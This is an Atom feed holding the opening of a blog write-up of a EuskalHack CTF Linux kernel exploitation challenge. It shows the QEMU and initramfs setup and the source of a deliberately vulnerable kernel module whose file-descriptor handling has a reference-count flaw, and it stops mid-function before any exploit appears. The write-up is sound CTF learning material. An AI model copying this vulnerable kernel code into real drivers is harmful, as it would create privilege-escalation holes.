@@ -1,0 +1,747 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>gum3t</title>
+    <subtitle>Catalan cybersecurity researcher and ctf player. Low level stuff.</subtitle>
+    <link rel="self" type="application/atom+xml" href="https://gum3t.xyz/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://gum3t.xyz"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-06-30T00:00:00+00:00</updated>
+    <id>https://gum3t.xyz/atom.xml</id>
+    <entry xml:lang="en">
+        <title>A &quot;Gau-Hack&quot; from EuskalHack</title>
+        <published>2024-06-30T00:00:00+00:00</published>
+        <updated>2024-06-30T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              gum3t
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/"/>
+        <id>https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/</id>
+        
+        <content type="html" xml:base="https://gum3t.xyz/posts/a-gau-hack-from-euskalhack/">&lt;p&gt;This is a kernel exploitation challenge created by &lt;a href=&quot;https:&#x2F;&#x2F;x.com&#x2F;javierprtd&quot;&gt;@javierprtd&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;In this challenge, we are given the source code of a vulnerable LKM (&lt;code&gt;ctf.c&lt;&#x2F;code&gt;), its Makefile and some code in C as a proof of concept on how to interact with the LKM (&lt;code&gt;poc.c&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
+&lt;p&gt;To be able to debug this LKM, we need a kernel image (I used &lt;code&gt;linux-6.6.34&lt;&#x2F;code&gt;), and a file system (I modified an &lt;code&gt;initramfs&lt;&#x2F;code&gt; image from an older CTF challenge).&lt;&#x2F;p&gt;
+&lt;p&gt;This is the bash script used to run the kernel image within QEMU:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;bin&#x2F;bash
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;qemu-system-x86_64 &lt;&#x2F;span&gt;&lt;span&gt;\
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -cpu&lt;&#x2F;span&gt;&lt;span&gt; kvm64,+smep,+smap \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -m&lt;&#x2F;span&gt;&lt;span&gt; 256M \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -nographic &lt;&#x2F;span&gt;&lt;span&gt;\
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -kernel&lt;&#x2F;span&gt;&lt;span&gt; bzImage-6.6.34 \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -append &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -monitor&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;null \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -initrd&lt;&#x2F;span&gt;&lt;span&gt; initramfs.cpio.gz \
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;    -s
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;init&lt;&#x2F;code&gt; file used within &lt;code&gt;initramfs&lt;&#x2F;code&gt; is the following:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chown -hR&lt;&#x2F;span&gt;&lt;span&gt; root: &#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chown -R&lt;&#x2F;span&gt;&lt;span&gt; user: &#x2F;home&#x2F;user
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; 0755&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -R&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; 0700&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -R&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;root&#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; 0 &#x2F;flag
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; u+s &#x2F;bin&#x2F;su
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mount -t&lt;&#x2F;span&gt;&lt;span&gt; proc none &#x2F;proc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mount -t&lt;&#x2F;span&gt;&lt;span&gt; sysfs none &#x2F;sys
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mount -t&lt;&#x2F;span&gt;&lt;span&gt; devtmpfs none &#x2F;dev
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mkdir -p&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;pts
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mount -vt&lt;&#x2F;span&gt;&lt;span&gt; devpts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -o&lt;&#x2F;span&gt;&lt;span&gt; gid=4,mode=620 none &#x2F;dev&#x2F;pts
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;sbin&#x2F;mdev -s
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# Disable boot at kernel panic
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;kernel.panic = 0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &amp;gt; &#x2F;etc&#x2F;sysctl.conf
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sysctl -p
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# ifup eth0 &amp;gt;&amp;amp; &#x2F;dev&#x2F;null
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;root
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;banner.txt
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;insmod&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;chall&#x2F;ctf.ko
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;home&#x2F;user
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# final mode
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;setsid&lt;&#x2F;span&gt;&lt;span&gt; cttyhack setuidgid 1000 sh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# test mode
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# setsid cttyhack setuidgid 0 sh
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;poweroff -f
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And to update the compressed &lt;code&gt;initramfs&lt;&#x2F;code&gt; image, I use the following script:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gcc -o&lt;&#x2F;span&gt;&lt;span&gt; exploit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -static &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gcc -o&lt;&#x2F;span&gt;&lt;span&gt; poc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -static&lt;&#x2F;span&gt;&lt;span&gt; poc.c
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cp&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;exploit .&#x2F;initramfs&#x2F;home&#x2F;user
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cp&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;poc .&#x2F;initramfs&#x2F;home&#x2F;user
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span&gt; initramfs
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;find&lt;&#x2F;span&gt;&lt;span&gt; .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -print0 &lt;&#x2F;span&gt;&lt;span&gt;\
+&lt;&#x2F;span&gt;&lt;span&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cpio --null -ov --format&lt;&#x2F;span&gt;&lt;span&gt;=newc \
+&lt;&#x2F;span&gt;&lt;span&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gzip -9 &lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; initramfs.cpio.gz
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mv&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;initramfs.cpio.gz ..&#x2F;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;source-code-analysis&quot;&gt;Source Code Analysis&lt;&#x2F;h2&gt;
+&lt;p&gt;If we check the provided source code for the vulnerable LKM, we can identify two main functions within ioctl:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;static long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;ctf_ioctl&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;code&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;arg&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;switch &lt;&#x2F;span&gt;&lt;span&gt;(code) {
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;case&lt;&#x2F;span&gt;&lt;span&gt; IOCTL_CTF_INSTALL_FILE:
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;* __user) arg);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;case&lt;&#x2F;span&gt;&lt;span&gt; IOCTL_CTF_CLOSE_FILE:
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close_file&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;* __user) arg);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EINVAL;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;install-file&quot;&gt;install_file&lt;&#x2F;h3&gt;
+&lt;p&gt;We can see below the content of the &lt;code&gt;install_file&lt;&#x2F;code&gt; function:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;* __user &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;arg&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; ret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; fd;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; files_struct *files;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *file;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; fdtable *fdt;
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;copy_from_user&lt;&#x2F;span&gt;&lt;span&gt;(&amp;amp;fd, arg, sizeof(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;))) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pr_err&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;error copy_from_user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EFAULT;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt; 
+&lt;&#x2F;span&gt;&lt;span&gt;	files = current-&amp;gt;files;
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;spin_lock&lt;&#x2F;span&gt;&lt;span&gt;(&amp;amp;files-&amp;gt;file_lock);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	fdt = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;files_fdtable&lt;&#x2F;span&gt;&lt;span&gt;(files);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd &amp;gt;= fdt-&amp;gt;max_fds)
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	file = fdt-&amp;gt;fd[fd];
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;spin_unlock&lt;&#x2F;span&gt;&lt;span&gt;(&amp;amp;files-&amp;gt;file_lock);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	ret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_unused_fd_flags&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(ret &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;goto&lt;&#x2F;span&gt;&lt;span&gt; error;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_file&lt;&#x2F;span&gt;&lt;span&gt;(file);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fd_install&lt;&#x2F;span&gt;&lt;span&gt;(ret, file);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; ret;
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;error:
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fput&lt;&#x2F;span&gt;&lt;span&gt;(file);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Overall, we can say this function is pretty similar to a &lt;code&gt;dup&lt;&#x2F;code&gt; syscall.&lt;&#x2F;p&gt;
+&lt;p&gt;If we look closely, we can see that this function initially receives a file descriptor from the user-space, then it gets the current process &lt;em&gt;files_struct&lt;&#x2F;em&gt; structure and later it locks the &lt;em&gt;files_struct&lt;&#x2F;em&gt; struct.&lt;&#x2F;p&gt;
+&lt;p&gt;Inside the lock, it retrieves the file descriptor table of the process, checks if the given file descriptor is valid and retrieves the &lt;em&gt;file&lt;&#x2F;em&gt; struct that corresponds to the given file descriptor. The &lt;em&gt;files_struct&lt;&#x2F;em&gt; lock is released after this part.&lt;&#x2F;p&gt;
+&lt;p&gt;After the lock release, a new file descriptor is allocated with &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt;, the &lt;code&gt;file-&amp;gt;f_count-&amp;gt;counter&lt;&#x2F;code&gt; (from now on, &lt;code&gt;f_count&lt;&#x2F;code&gt;)  is incremented by one and finally, the file descriptor is associated with the &lt;em&gt;file&lt;&#x2F;em&gt; struct in the file descriptor table of the running process.&lt;&#x2F;p&gt;
+&lt;p&gt;The error management just decrements &lt;code&gt;f_count&lt;&#x2F;code&gt; by one with &lt;code&gt;fput(file)&lt;&#x2F;code&gt; and returns &lt;code&gt;EBADF&lt;&#x2F;code&gt;. This part is pretty interesting as we will see later on.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;close-file&quot;&gt;close_file&lt;&#x2F;h3&gt;
+&lt;p&gt;We can see the below the content of the &lt;code&gt;close_file&lt;&#x2F;code&gt; function:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;close_file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;* __user &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;arg&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; fd;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; files_struct *files;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *file;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; fdtable *fdt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;copy_from_user&lt;&#x2F;span&gt;&lt;span&gt;(&amp;amp;fd, arg, sizeof(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;))) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pr_err&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;error copy_from_user&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EFAULT;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	files = current-&amp;gt;files;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;spin_lock&lt;&#x2F;span&gt;&lt;span&gt;(&amp;amp;files-&amp;gt;file_lock);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	fdt = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;files_fdtable&lt;&#x2F;span&gt;&lt;span&gt;(files);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd &amp;gt;= fdt-&amp;gt;max_fds)
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EBADF;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	file = fdt-&amp;gt;fd[fd];
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;spin_unlock&lt;&#x2F;span&gt;&lt;span&gt;(&amp;amp;files-&amp;gt;file_lock);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(file) {
